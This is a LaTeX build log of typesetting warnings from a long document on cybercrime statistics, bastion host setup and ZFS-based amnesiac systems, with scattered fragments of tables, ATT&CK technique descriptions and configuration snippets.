+Overfull \hbox (260.00262pt too wide) in paragraph at lines 2484--2487
+\TU/LiberationSerif(0)/m/n/10 The source workbook was \TU/LiberationMono(0)/m/n
+/10 ComputerCrime_AUG2026_Impact_Final_With_C5C7_IFERROR_CHARTS_FIXED_UPDATED.x
+lsx\TU/LiberationSerif(0)/m/n/10 .
+ []
+
+
+Overfull \hbox (25.53676pt too wide) in paragraph at lines 2484--2487
+\TU/LiberationSerif(0)/m/n/10 The script extracted the seven annual observation
+s (2016–2022) from the Chattanooga-
+ []
+
+
+Overfull \hbox (16.94363pt too wide) in paragraph at lines 2484--2487
+\TU/LiberationSerif(0)/m/n/10 The excluded row was State CA, Year 2016, Categor
+y Threats/Stalking/Harassment/
+ []
+
+
+Overfull \hbox (26.41264pt too wide) in alignment at lines 2493--2498
+ [] [] [] [] [] [] [] 
+ []
+
+
+Overfull \hbox (26.41264pt too wide) in alignment at lines 2498--2502
+ [] [] [] [] [] [] [] 
+ []
+
+
+Overfull \hbox (26.41264pt too wide) in alignment at lines 2502--2507
+ [] [] [] [] [] [] [] 
+ []
+
+[156]
+Overfull \hbox (28.16057pt too wide) in alignment at lines 2509--2514
+ [] [] [] [] [] [] [] 
+ []
+
+
+Overfull \hbox (28.16057pt too wide) in alignment at lines 2514--2518
+ [] [] [] [] [] [] [] 
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2522--2522
+[]|\TU/LiberationSerif(0)/m/n/10 Personal Data
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2523--2523
+[]|\TU/LiberationSerif(0)/m/n/10 Personal Data
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2524--2524
+[]|\TU/LiberationSerif(0)/m/n/10 Personal Data
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2534--2534
+[]|\TU/LiberationSerif(0)/m/n/10 Crimes Against
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2535--2535
+[]|\TU/LiberationSerif(0)/m/n/10 Crimes Against
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2536--2536
+[]|\TU/LiberationSerif(0)/m/n/10 Crimes Against
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2540--2540
+[]|\TU/LiberationSerif(0)/m/n/10 Threats/Stalking/
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2540--2540
+\TU/LiberationSerif(0)/m/n/10 Harassment/
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2541--2541
+[]|\TU/LiberationSerif(0)/m/n/10 Threats/Stalking/
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2541--2541
+\TU/LiberationSerif(0)/m/n/10 Harassment/
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2542--2542
+[]|\TU/LiberationSerif(0)/m/n/10 Threats/Stalking/
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2542--2542
+\TU/LiberationSerif(0)/m/n/10 Harassment/
+ []
+
+
+Overfull \hbox (28.16057pt too wide) in alignment at lines 2518--2553
+ [] [] [] [] [] [] [] 
+ []
+
+[157]
+Underfull \hbox (badness 10000) in paragraph at lines 2571--2571
+[]|\TU/LiberationSerif(0)/m/n/10 Personal Data
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2572--2572
+[]|\TU/LiberationSerif(0)/m/n/10 Personal Data
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2579--2579
+[]|\TU/LiberationSerif(0)/m/n/10 Crimes Against
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2580--2580
+[]|\TU/LiberationSerif(0)/m/n/10 Crimes Against
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2583--2583
+[]|\TU/LiberationSerif(0)/m/n/10 Threats/Stalking/
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2583--2583
+\TU/LiberationSerif(0)/m/n/10 Harassment/
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2584--2584
+[]|\TU/LiberationSerif(0)/m/n/10 Threats/Stalking/
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2584--2584
+\TU/LiberationSerif(0)/m/n/10 Harassment/
+ []
+
+[158]
+Underfull \hbox (badness 10000) in paragraph at lines 2606--2606
+[]|\TU/LiberationSerif(0)/m/n/10 Personal Data
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2607--2607
+[]|\TU/LiberationSerif(0)/m/n/10 Personal Data
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2614--2614
+[]|\TU/LiberationSerif(0)/m/n/10 Crimes Against
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2615--2615
+[]|\TU/LiberationSerif(0)/m/n/10 Crimes Against
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2618--2618
+[]|\TU/LiberationSerif(0)/m/n/10 Threats/Stalking/
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2618--2618
+\TU/LiberationSerif(0)/m/n/10 Harassment/
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2619--2619
+[]|\TU/LiberationSerif(0)/m/n/10 Threats/Stalking/
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2619--2619
+\TU/LiberationSerif(0)/m/n/10 Harassment/
+ []
+
+[159]
+File: figures/cybercrime_emmeans_ci.png Graphic file (type bmp)
+<figures/cybercrime_emmeans_ci.png>
+File: figures/cybercrime_contrasts_ci.png Graphic file (type bmp)
+<figures/cybercrime_contrasts_ci.png>
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [160]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [161]
+Overfull \hbox (5.9097pt too wide) in paragraph at lines 2643--2643
+|[]\TU/LiberationSans(0)/b/n/14.4 Conditional Framework Findings (AS<TN
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2663--2663
+[]|\TU/LiberationSerif(0)/m/n/9 Personal Data
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2672--2672
+[]|\TU/LiberationSerif(0)/m/n/9 Crimes Against
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2673--2673
+[]|\TU/LiberationSerif(0)/m/n/9 Threats/Stalking/
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2673--2673
+\TU/LiberationSerif(0)/m/n/9 Harassment/
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [162]
+Underfull \hbox (badness 10000) in paragraph at lines 2689--2689
+[]|\TU/LiberationSerif(0)/m/n/9 Personal Data
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2698--2698
+[]|\TU/LiberationSerif(0)/m/n/9 Crimes Against
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2699--2699
+[]|\TU/LiberationSerif(0)/m/n/9 Threats/Stalking/
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2699--2699
+\TU/LiberationSerif(0)/m/n/9 Harassment/
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [163]
+Underfull \vbox (badness 6575) has occurred while \output is active []
+
+ [164]
+Overfull \hbox (24.87389pt too wide) in paragraph at lines 2770--2780
+ [][] 
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2793--2793
+[]|[]\TU/LiberationSerif(0)/b/n/9 cybercrime
+ []
+
+
+Underfull \hbox (badness 2846) in paragraph at lines 2793--2793
+[]|\TU/LiberationSerif(0)/b/n/9 Section Refer-
+ []
+
+
+Underfull \hbox (badness 1231) in paragraph at lines 2793--2794
+[]|\TU/LiberationSerif(0)/b/n/9 Figure/Table Ref-
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2795--2795
+[]|\TU/LiberationSerif(0)/m/n/9 Personal Data
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2795--2795
+[]|\TU/LiberationSerif(0)/m/n/9 Lower Bound
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2796--2796
+[]|\TU/LiberationSerif(0)/m/n/9 Upper Bound
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2797--2797
+[]|\TU/LiberationSerif(0)/m/n/9 Figure for
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2797--2797
+\TU/LiberationSerif(0)/m/n/9 Monte Carlo
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2800--2800
+[]|\TU/LiberationSerif(0)/m/n/9 Lower Bound
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2801--2801
+[]|\TU/LiberationSerif(0)/m/n/9 Upper Bound
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2802--2802
+[]|\TU/LiberationSerif(0)/m/n/9 Figure for
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2802--2802
+\TU/LiberationSerif(0)/m/n/9 Monte Carlo
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2805--2805
+[]|\TU/LiberationSerif(0)/m/n/9 Lower Bound
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2806--2806
+[]|\TU/LiberationSerif(0)/m/n/9 Upper Bound
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2807--2807
+[]|\TU/LiberationSerif(0)/m/n/9 Figure for
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2807--2807
+\TU/LiberationSerif(0)/m/n/9 Monte Carlo
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2810--2810
+[]|\TU/LiberationSerif(0)/m/n/9 Lower Bound
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2811--2811
+[]|\TU/LiberationSerif(0)/m/n/9 Upper Bound
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2812--2812
+[]|\TU/LiberationSerif(0)/m/n/9 Figure for
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2812--2812
+\TU/LiberationSerif(0)/m/n/9 Monte Carlo
+ []
+
+
+Overfull \hbox (16.70035pt too wide) in paragraph at lines 2791--2816
+ [][] 
+ []
+
+
+Underfull \vbox (badness 5446) has occurred while \output is active []
+
+ [165]
+Underfull \hbox (badness 10000) in paragraph at lines 2825--2825
+[]|[]\TU/LiberationSerif(0)/b/n/9 cybercrime
+ []
+
+
+Underfull \hbox (badness 2846) in paragraph at lines 2825--2825
+[]|\TU/LiberationSerif(0)/b/n/9 Section Refer-
+ []
+
+
+Underfull \hbox (badness 1231) in paragraph at lines 2825--2826
+[]|\TU/LiberationSerif(0)/b/n/9 Figure/Table Ref-
+ []
+
+
+Overfull \hbox (1.16869pt too wide) in paragraph at lines 2827--2827
+[]|\TU/LiberationSerif(0)/m/n/9 IPR/Counterfeit| 
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2827--2827
+[]|\TU/LiberationSerif(0)/m/n/9 Lower Bound
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2828--2828
+[]|\TU/LiberationSerif(0)/m/n/9 Upper Bound
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2829--2829
+[]|\TU/LiberationSerif(0)/m/n/9 Figure for
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2829--2829
+\TU/LiberationSerif(0)/m/n/9 Monte Carlo
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2832--2832
+[]|\TU/LiberationSerif(0)/m/n/9 Lower Bound
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2833--2833
+[]|\TU/LiberationSerif(0)/m/n/9 Upper Bound
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2834--2834
+[]|\TU/LiberationSerif(0)/m/n/9 Figure for
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2834--2834
+\TU/LiberationSerif(0)/m/n/9 Monte Carlo
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2837--2837
+[]|\TU/LiberationSerif(0)/m/n/9 Lower Bound
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2838--2838
+[]|\TU/LiberationSerif(0)/m/n/9 Upper Bound
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2839--2839
+[]|\TU/LiberationSerif(0)/m/n/9 Figure for
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2839--2839
+\TU/LiberationSerif(0)/m/n/9 Monte Carlo
+ []
+
+
+Overfull \hbox (16.70035pt too wide) in paragraph at lines 2823--2844
+[][] 
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [166]
+[167]
+Underfull \hbox (badness 10000) in paragraph at lines 2875--2877
+
+ []
+
+
+Overfull \hbox (44.24307pt too wide) detected at line 2914
+[] \OT1/cmr/m/n/10 = [] \OML/cmm/m/it/10 :
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 2918--2920
+
+ []
+
+File: figures/discrete_persDataBreach_count.png Graphic file (type bmp)
+<figures/discrete_persDataBreach_count.png>
+[168]
+Overfull \hbox (15.4246pt too wide) in paragraph at lines 2950--3022
+ [] 
+ []
+
+
+Overfull \hbox (15.4246pt too wide) in paragraph at lines 2950--3022
+ [] 
+ []
+
+
+Overfull \hbox (15.4246pt too wide) in paragraph at lines 2950--3022
+ [] 
+ []
+
+
+Overfull \hbox (15.4246pt too wide) in paragraph at lines 2950--3022
+ [] 
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [169]
+[170]
+Underfull \hbox (badness 10000) in paragraph at lines 3058--3060
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 3101--3103
+
+ []
+
+File: figures/discrete_phishing_count.png Graphic file (type bmp)
+<figures/discrete_phishing_count.png>
+[171] [172]
+Underfull \hbox (badness 10000) in paragraph at lines 3210--3212
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 3253--3255
+
+ []
+
+File: figures/histogram_ransomware.png Graphic file (type bmp)
+<figures/histogram_ransomware.png>
+[173]
+File: figures/count_ransomware_percentile.png Graphic file (type bmp)
+<figures/count_ransomware_percentile.png>
+ [174]
+Underfull \hbox (badness 10000) in paragraph at lines 3317--3319
+
+ []
+
+
+Overfull \hbox (7.57642pt too wide) detected at line 3356
+[] \OT1/cmr/m/n/10 = [] \OML/cmm/m/it/10 :
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 3360--3362
+
+ []
+
+File: figures/discrete_extortion_count.png Graphic file (type bmp)
+<figures/discrete_extortion_count.png>
+[175]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [176]
+[177]
+
+Package hyperref Warning: Token not allowed in a PDF string (Unicode):
+(hyperref)                removing `\gls' on input line 3496.
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 3526--3528
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 3575--3577
+
+ []
+
+File: figures/binary_ipr_count.png Graphic file (type bmp)
+<figures/binary_ipr_count.png>
+[178]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [179]
+[180]
+Underfull \hbox (badness 10000) in paragraph at lines 3676--3678
+
+ []
+
+
+Overfull \hbox (5.90962pt too wide) detected at line 3716
+[] \OT1/cmr/m/n/10 = [] \OML/cmm/m/it/10 :
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 3720--3722
+
+ []
+
+File: figures/discrete_idtheft_count.png Graphic file (type bmp)
+<figures/discrete_idtheft_count.png>
+[181]
+Overfull \hbox (15.4246pt too wide) in paragraph at lines 3752--3799
+ [] 
+ []
+
+[182]
+Underfull \hbox (badness 10000) in paragraph at lines 3832--3834
+
+ []
+
+
+Overfull \hbox (2.02084pt too wide) detected at line 3871
+[] \OT1/cmr/m/n/10 = [] \OML/cmm/m/it/10 :
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 3875--3877
+
+ []
+
+File: figures/discrete_bec_count.png Graphic file (type bmp)
+<figures/discrete_bec_count.png>
+[183]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [184]
+Overfull \hbox (10.1059pt too wide) in paragraph at lines 3967--3967
+|[]\TU/LiberationSans(0)/b/n/12 Business Email Compromise Versus []ransomware| 
+
+ []
+
+
+Package hyperref Warning: Token not allowed in a PDF string (Unicode):
+(hyperref)                removing `\gls' on input line 3967.
+
+[185]
+Underfull \hbox (badness 1910) in paragraph at lines 4000--4001
+[]|\TU/LiberationSerif(0)/m/n/10 Initial Access, Credential Ac-
+ []
+
+
+Underfull \hbox (badness 2126) in paragraph at lines 4015--4016
+[]|[]\TU/LiberationSerif(0)/m/n/10 phishing (T1566), Phishing Attachment (T1566
+.001),
+ []
+
+
+Underfull \hbox (badness 1874) in paragraph at lines 4017--4018
+[]|\TU/LiberationSerif(0)/m/n/10 Data []encrypted for Impact (T1486), Financial
+ Theft
+ []
+
+
+Underfull \hbox (badness 1454) in paragraph at lines 4019--4020
+[]|\TU/LiberationSerif(0)/m/n/10 Financial Theft (T1657), Data Encrypted for Im
+pact
+ []
+
+
+Underfull \hbox (badness 1960) in paragraph at lines 4019--4020
+\TU/LiberationSerif(0)/m/n/10 (T1486), Data Leak Threats associated with double
+-
+ []
+
+
+Overfull \hbox (39.4774pt too wide) in paragraph at lines 4009--4028
+ [][] 
+ []
+
+) (./chapters/bastion_host.tex [186] [187] [188
+
+]
+Chapter 6.
+[189] [190]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [191]
+Underfull \vbox (badness 7851) has occurred while \output is active []
+
+ [192]
+[193] [194] [195]
+Overfull \hbox (13.90016pt too wide) in paragraph at lines 156--158
+[]\TU/LiberationSerif(0)/m/n/10 You will need to uncomment an entry in one file
+ to get the mail: /usr/local/ossec-
+ []
+
+
+Overfull \hbox (58.76744pt too wide) in paragraph at lines 159--166
+\TU/LiberationSerif(0)/m/n/10 <email_notification>yes</email_notification> <ema
+il_to>sammy@example.com</email_to>
+ []
+
+
+Overfull \hbox (96.25279pt too wide) in paragraph at lines 159--166
+\TU/LiberationSerif(0)/m/n/10 <smtp_server>mail.example.com.</smtp_server> <ema
+il_from>sammy@example.com</email_from>
+ []
+
+
+Overfull \hbox (6.18384pt too wide) in paragraph at lines 167--167
+|[]\TU/LiberationSans(0)/b/n/14.4 Adjusting pfSense for Incoming HAProxy
+ []
+
+) (./chapters/amnesiac_systems.tex [196]
+Chapter 7.
+
+Overfull \hbox (17.99998pt too wide) in paragraph at lines 20--35
+ [][] 
+ []
+
+
+Underfull \hbox (badness 1102) in paragraph at lines 48--49
+\TU/LiberationSerif(0)/m/n/10 elevate privileges using system mechanisms
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 48--49
+\TU/LiberationSerif(0)/m/n/10 that trigger execution based on specific
+ []
+
+
+Underfull \hbox (badness 3364) in paragraph at lines 50--51
+[]|\TU/LiberationSerif(0)/m/n/10 ”Adversaries may use execution guardrails
+ []
+
+
+Underfull \hbox (badness 3713) in paragraph at lines 50--51
+\TU/LiberationSerif(0)/m/n/10 to constrain execution to specific environ-
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 51--51
+[]|\TU/LiberationSerif(0)/m/n/10 Exfiltration Over Physical
+ []
+
+
+Overfull \hbox (17.99998pt too wide) in paragraph at lines 40--55
+ [][] 
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 67--68
+\TU/LiberationSerif(0)/m/n/10 into software images to establish persis-
+ []
+
+
+Overfull \hbox (17.99998pt too wide) in paragraph at lines 60--74
+ [][] 
+ []
+
+
+Underfull \hbox (badness 1389) in paragraph at lines 83--84
+[]|\TU/LiberationSerif(0)/m/n/10 ”Adversaries may create, modify, or delete
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 83--84
+\TU/LiberationSerif(0)/m/n/10 cloud resources to achieve their objec-
+ []
+
+
+Underfull \hbox (badness 1221) in paragraph at lines 84--85
+[]|\TU/LiberationSerif(0)/m/n/10 ”Adversaries may attempt to modify hierar-
+ []
+
+
+Underfull \hbox (badness 2941) in paragraph at lines 84--85
+\TU/LiberationSerif(0)/m/n/10 (IaaS) environments in order to evade de-
+ []
+
+
+Underfull \hbox (badness 3612) in paragraph at lines 85--86
+\TU/LiberationSerif(0)/m/n/10 Registry to hide []configuration information,
+ []
+
+
+Underfull \hbox (badness 2181) in paragraph at lines 88--88
+[]|\TU/LiberationSerif(0)/m/n/10 Obfuscated Files or Informa-
+ []
+
+
+Underfull \hbox (badness 1681) in paragraph at lines 88--89
+[]|\TU/LiberationSerif(0)/m/n/10 ”Adversaries may obfuscate their malicious
+ []
+
+
+Underfull \hbox (badness 2181) in paragraph at lines 88--89
+\TU/LiberationSerif(0)/m/n/10 code, []configuration files, or other artifacts
+ []
+
+
+Underfull \hbox (badness 2119) in paragraph at lines 88--89
+\TU/LiberationSerif(0)/m/n/10 to make detection and analysis more diffi-
+ []
+
+
+Overfull \hbox (17.99998pt too wide) in paragraph at lines 79--94
+ [][] 
+ []
+
+
+Underfull \hbox (badness 1038) in paragraph at lines 107--108
+[]|\TU/LiberationSerif(0)/m/n/10 ”Adversaries may use []protocol tunneling to
+ []
+
+
+Underfull \hbox (badness 1043) in paragraph at lines 108--108
+\TU/LiberationSerif(0)/m/n/10 as an intermediary for network communica-
+ []
+
+
+Underfull \hbox (badness 1990) in paragraph at lines 111--112
+\TU/LiberationSerif(0)/m/n/10 services, drivers, and other system compo-
+ []
+
+
+Overfull \hbox (17.99998pt too wide) in paragraph at lines 100--115
+ [][] 
+ []
+
+
+Underfull \hbox (badness 5970) in paragraph at lines 130--131
+[]|\TU/LiberationSerif(0)/m/n/10 ”Adversaries may create or modify refer-
+ []
+
+
+Underfull \hbox (badness 3471) in paragraph at lines 130--131
+\TU/LiberationSerif(0)/m/n/10 ences in user document templates to con-
+ []
+
+
+Overfull \hbox (17.99998pt too wide) in paragraph at lines 121--136
+ [][] 
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [197
+
+]
+[198] [199] [200] [201] [202] [203] [204]
+Underfull \vbox (badness 7613) has occurred while \output is active []
+
+ [205]
+[206] [207]
+File: figures/public to private.png Graphic file (type bmp)
+<figures/public to private.png>
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [208]
+[209]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [210]
+Underfull \hbox (badness 2065) in paragraph at lines 355--355
+\TU/LiberationSerif(0)/m/n/10 ciate the logical with
+ []
+
+
+Overfull \hbox (6.5517pt too wide) in paragraph at lines 356--357
+[]|\TU/LiberationMono(0)/m/n/10 [Host]-[PositionNumber
+ []
+
+
+Overfull \hbox (11.5099pt too wide) in paragraph at lines 356--357
+\TU/LiberationMono(0)/m/n/10 0-7]-[Serial_Number]\TU/LiberationSerif(0)/m/n/10 
+[81]| 
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 357--357
+[]|\TU/LiberationSerif(0)/m/n/10 Faster performance:
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 358--359
+[]|\TU/LiberationMono(0)/m/n/10 zfs[] set
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 358--359
+\TU/LiberationMono(0)/m/n/10 compress=gzip-6
+ []
+
+
+Underfull \hbox (badness 4096) in paragraph at lines 359--359
+[]|\TU/LiberationSerif(0)/m/n/10 Make a note on the
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 360--361
+[]|\TU/LiberationMono(0)/m/n/10 zfs set
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 362--362
+[]|\TU/LiberationSerif(0)/m/n/10 Set aside space for
+ []
+
+
+Underfull \hbox (badness 1748) in paragraph at lines 362--362
+\TU/LiberationSerif(0)/m/n/10 directory and its chil-
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 363--363
+[]|\TU/LiberationSerif(0)/m/n/10 Set aside space but
+ []
+
+
+Underfull \hbox (badness 2050) in paragraph at lines 363--363
+\TU/LiberationSerif(0)/m/n/10 don’t count snapshots
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 364--365
+[]|\TU/LiberationMono(0)/m/n/10 zfs[] set canmount=off
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 365--365
+[]|\TU/LiberationSerif(0)/m/n/10 Specify where to
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 365--366
+[]|\TU/LiberationMono(0)/m/n/10 zfs set
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 365--366
+\TU/LiberationMono(0)/m/n/10 mountpoint=/SOME
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 366--367
+[]|\TU/LiberationMono(0)/m/n/10 zfs set readonly=off
+ []
+
+
+Underfull \hbox (badness 1466) in paragraph at lines 367--367
+[]|\TU/LiberationSerif(0)/m/n/10 Control if it can exe-
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 367--368
+[]|\TU/LiberationMono(0)/m/n/10 zfs[] set exec=off
+ []
+
+
+Underfull \hbox (badness 2809) in paragraph at lines 368--368
+[]|\TU/LiberationSerif(0)/m/n/10 Make more than one
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 368--369
+[]|\TU/LiberationMono(0)/m/n/10 zfs set copies=2
+ []
+
+
+Overfull \hbox (23.99998pt too wide) in paragraph at lines 351--371
+ [][] 
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [211]
+[212]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [213]
+[214] [215]
+Underfull \hbox (badness 10000) in paragraph at lines 467--469
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 467--469
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 479--480
+
+ []
+
+
+Underfull \vbox (badness 6859) has occurred while \output is active []
+
+ [216]
+Underfull \hbox (badness 10000) in paragraph at lines 486--493
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 486--493
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 486--493
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 486--493
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 495--503
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 495--503
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 495--503
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 495--503
+
+ []
+
+[217]
+Underfull \hbox (badness 10000) in paragraph at lines 505--508
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 505--508
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 514--518
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 514--518
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 521--522
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 523--527
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 523--527
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 523--527
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 528--532
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 528--532
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 528--532
+
+ []
+
+[218]
+Underfull \hbox (badness 10000) in paragraph at lines 533--537
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 533--537
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 533--537
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 538--541
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 538--541
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 538--541
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 538--541
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 542--544
+
+ []
+
+
+Overfull \hbox (10.82347pt too wide) in paragraph at lines 542--544
+[]\TU/LiberationMono(0)/m/n/10 zpool create []RAID P O O L _ N A M E D I S K _ 
+L A B E L/[]ZFS_[]partition_L
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 542--544
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 542--544
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 545--550
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 551--555
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 551--555
+
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [219]
+[220] [221]
+LaTeX Font Info:    Font shape `TU/LiberationMono(0)/b/n' will be
+(Font)              scaled to size 10.0pt on input line 597.
+
+Underfull \hbox (badness 10000) in paragraph at lines 609--611
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 613--617
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 613--617
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 613--617
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 613--617
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 613--617
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 620--623
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 620--623
+
+ []
+
+[222]
+Underfull \hbox (badness 10000) in paragraph at lines 624--627
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 624--627
+
+ []
+
+
